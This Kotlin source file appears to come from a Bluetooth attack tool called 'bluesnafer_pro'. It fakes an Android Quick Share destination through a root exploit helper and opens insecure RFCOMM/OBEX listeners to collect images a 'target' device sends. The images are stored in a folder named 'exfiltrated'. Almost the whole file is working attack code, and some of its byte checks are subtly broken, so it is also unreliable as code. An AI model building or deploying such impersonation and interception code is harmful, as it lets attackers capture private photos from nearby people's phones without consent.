package com.bluesnafer_pro

import android.bluetooth.*
import android.util.Log
import java.io.*
import java.util.*
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

/**
 * Receptor moderno de imágenes vía Quick Share / Nearby Connections (Android/Samsung).
 *
 * El canal BLE 0xFE2C (Nearby Connections) es el que usa Android Quick Share para el
 * intercambio de token de conexión. Este servidor:
 *  1. Anuncia el dispositivo (si hay root) para que el objetivo nos muestre como destino cercano.
 *  2. Escucha en OBEX/RFCOMM (tanto el servicio Nearby 0xFE2C como el clásico OPP 0x1105)
 *     para recibir el objeto (imagen) que el objetivo comparta.
 * Devuelve {success, images:[{name,size,remotePath,localPath}], imagesCount, totalBytes}.
 */
object QuickShareServerMode {
    private const val TAG = "QuickShareServerMode"
    private val NEARBY_UUID = UUID.fromString("0000FE2C-0000-1000-8000-00805F9B34FB")
    private val OPP_UUID = UUID.fromString("00001105-0000-1000-8000-00805F9B34FB")
    private val FILE_TRANSFER_UUID = UUID.fromString("00001106-0000-1000-8000-00805F9B34FB")

    fun waitForSharedImages(
        device: BluetoothDevice,
        timeoutSec: Int = 35,
        maxImages: Int = 10,
        advertise: Boolean = true
    ): Map<String, Any> {
        Log.d(TAG, "Quick Share server mode waiting for pushed images from ${device.address}")
        val receivedImages = mutableListOf<Map<String, Any>>()
        var serverSockets = mutableListOf<BluetoothServerSocket>()
        var clientSocket: BluetoothSocket? = null

        return try {
            if (advertise) {
                try { RootExploitExecutor.advertiseNearbyShare("TGTBPro-${device.name ?: "Share"}") } catch (_: Throwable) {}
            }

            val adapter = BluetoothAdapter.getDefaultAdapter()
                ?: return mapOf("success" to false, "error" to "BT no disponible")

            val near = try {
                adapter.listenUsingInsecureRfcommWithServiceRecord("NearbyShare", NEARBY_UUID)
            } catch (_: Exception) { null }
            val opp = try {
                adapter.listenUsingInsecureRfcommWithServiceRecord("OPP_Server", OPP_UUID)
            } catch (_: Exception) { null }
            val ftp = try {
                adapter.listenUsingInsecureRfcommWithServiceRecord("FTP_Server", FILE_TRANSFER_UUID)
            } catch (_: Exception) { null }

            (listOfNotNull(near, opp, ftp)).forEach { serverSockets.add(it) }
            if (serverSockets.isEmpty()) {
                return mapOf("success" to false, "error" to "No se pudieron abrir sockets de recepción")
            }
val deadline = System.currentTimeMillis() + (timeoutSec * 1000L)
            for ((idx, srv) in serverSockets.withIndex()) {
                if (receivedImages.size >= maxImages || System.currentTimeMillis() >= deadline) break
                val acceptLatch = CountDownLatch(1)
                var accepted: BluetoothSocket? = null
                Thread {
                    try {
                        val remain = ((deadline - System.currentTimeMillis()) / 1000).toInt().coerceAtLeast(3)
                        accepted = srv.accept(remain * 1000)
                    } catch (_: IOException) {}
                    acceptLatch.countDown()
                }.apply { start() }

                if (!acceptLatch.await(5, TimeUnit.SECONDS)) continue
                val sock = accepted ?: continue
                clientSocket = sock

                val input = sock.inputStream
                val output = sock.outputStream

                val (connectCode, maxPacket) = obexConnect(input, output)
                if (connectCode != 0xA0) continue

                Log.d(TAG, "Quick Share cliente conectado (socket #$idx), recibiendo PUT...")
                while (System.currentTimeMillis() < deadline && receivedImages.size < maxImages) {
                    val header = ByteArray(3)
                    val read = readAll(input, header, 3, 2000)
                    if (read < 3) break
                    val opcode = header[0].toInt() and 0xFF
                    if (opcode == 0x02) {
                        val length = ((header[1].toInt() and 0xFF) shl 8) or (header[2].toInt() and 0xFF)
                        if (length < 3) break
                        val body = ByteArray(length - 3)
                        val bodyRead = readAll(input, body, body.size, 5000)
                        if (bodyRead < 1) break
                        val name = extractNameFromHeaders(body) ?: "quick_share_${receivedImages.size}.jpg"
                        val imageData = extractBodyFromHeaders(body) ?: byteArrayOf()
                        if (imageData.isNotEmpty() && isImageData(imageData)) {
                            val ctx = BluetoothMethodHandler.getAppContext()
                            if (ctx != null) {
                                val dir = File(File(ctx.filesDir, "exfiltrated"), "quick_share")
                                dir.mkdirs()
                                val safeName = "qs_${System.currentTimeMillis()}_${receivedImages.size}.jpg"
                                val outFile = File(dir, safeName)
                                outFile.writeBytes(imageData)
                                receivedImages.add(
                                    mapOf(
                                        "name" to name,
                                        "size" to imageData.size,
                                        "mimeType" to detectMimeType(imageData),
                                        "remotePath" to "quickshare://${device.address}/$name",
                                        "localPath" to outFile.absolutePath
                                    )
                                )
                                Log.d(TAG, "Quick Share recibió imagen: $safeName (${imageData.size} bytes)")
                            }
                        }
                        val ack = byteArrayOf(0x90.toByte(), 0x00, 0x03)
                        try { output.write(ack); output.flush() } catch (_: IOException) {}
                    } else if (opcode == 0x81 || opcode == 0x01) {
                        break
                    }
                }
            }

            mapOf(
                "success" to (receivedImages.isNotEmpty()),
                "images" to receivedImages,
                "imagesCount" to receivedImages.size,
                "totalBytes" to receivedImages.fold(0L) { acc, img -> acc + ((img["size"] as? Int ?: 0).toLong()) },
                "method" to "quickshare_server",
                "message" to if (receivedImages.isNotEmpty())
                    "Quick Share server: ${receivedImages.size} imágenes compartidas recibidas"
                    else "Quick Share server: sin imágenes recibidas (el target no compartió)"
            )
        } catch (e: Exception) {
            Log.e(TAG, "Quick Share server error: ${e.message}")
            mapOf("success" to false, "error" to (e.message ?: "unknown error"), "method" to "quickshare_server")
        } finally {
            try { clientSocket?.close() } catch (_: Exception) {}
            serverSockets.forEach { try { it.close() } catch (_: Exception) {} }
        }
    }
private fun obexConnect(input: InputStream, output: OutputStream): Pair<Int, Int> {
        val connect = byteArrayOf(0x80.toByte(), 0x00, 0x07, 0x10, 0x00, 0x40, 0x00)
        try { output.write(connect); output.flush() } catch (_: IOException) { return Pair(-1, 4096) }
        val resp = ByteArray(7)
        val read = readAll(input, resp, 7, 5000)
        if (read < 3) return Pair(-1, 4096)
        val responseCode = resp[0].toInt() and 0xFF
        val maxPacket = if (resp.size > 6) {
            ((resp[5].toInt() and 0xFF) shl 8) or (resp[6].toInt() and 0xFF)
        } else 4096
        return Pair(responseCode, maxPacket.coerceAtMost(16384))
    }

    private fun extractNameFromHeaders(data: ByteArray): String? {
        var offset = 0
        while (offset < data.size) {
            val headerId = data[offset].toInt() and 0xFF
            if (headerId == 0x01) {
                if (offset + 2 >= data.size) break
                val len = ((data[offset + 1].toInt() and 0xFF) shl 8) or (data[offset + 2].toInt() and 0xFF)
                val nameBytes = data.copyOfRange(offset + 3, (offset + len).coerceAtMost(data.size))
                return String(nameBytes, Charsets.UTF_8).trimEnd('\u0000')
            }
            if (offset + 2 >= data.size) break
            val len = ((data[offset + 1].toInt() and 0xFF) shl 8) or (data[offset + 2].toInt() and 0xFF)
            offset += len.coerceAtLeast(3)
        }
        return null
    }

    private fun extractBodyFromHeaders(data: ByteArray): ByteArray? {
        var offset = 0
        while (offset < data.size) {
            val headerId = data[offset].toInt() and 0xFF
            if (headerId == 0x48 || headerId == 0x49) {
                if (offset + 2 >= data.size) break
                val len = ((data[offset + 1].toInt() and 0xFF) shl 8) or (data[offset + 2].toInt() and 0xFF)
                val end = (offset + len).coerceAtMost(data.size)
                if (end > offset + 3) return data.copyOfRange(offset + 3, end)
                return byteArrayOf()
            }
            if (offset + 2 >= data.size) break
            val len = ((data[offset + 1].toInt() and 0xFF) shl 8) or (data[offset + 2].toInt() and 0xFF)
            offset += len.coerceAtLeast(3)
        }
        return null
    }

    private fun isImageData(data: ByteArray): Boolean {
        if (data.size < 2) return false
        return (data[0].toInt() == 0xFF && data[1].toInt() == 0xD8) ||
            (data[0].toInt() == 0x89 && data[1].toInt() == 0x50) ||
            (data[0].toInt() == 0x47 && data[1].toInt() == 0x49) ||
            (data[0].toInt() == 0x42 && data[1].toInt() == 0x4D)
    }

    private fun detectMimeType(data: ByteArray): String {
        if (data.size < 2) return "image/unknown"
        return when {
            data[0].toInt() == 0xFF && data[1].toInt() == 0xD8 -> "image/jpeg"
            data[0].toInt() == 0x89 && data[1].toInt() == 0x50 -> "image/png"
            data[0].toInt() == 0x47 && data[1].toInt() == 0x49 -> "image/gif"
            data[0].toInt() == 0x42 && data[1].toInt() == 0x4D -> "image/bmp"
            else -> "image/unknown"
        }
    }

    private fun readAll(input: InputStream, buffer: ByteArray, maxLen: Int, timeoutMs: Int): Int {
        var total = 0
        val deadline = System.currentTimeMillis() + timeoutMs
        while (total < maxLen && System.currentTimeMillis() < deadline) {
            val read = try { input.read(buffer, total, maxLen - total) } catch (_: Exception) { -1 }
            if (read < 0) break
            total += read
        }
        return total
    }
}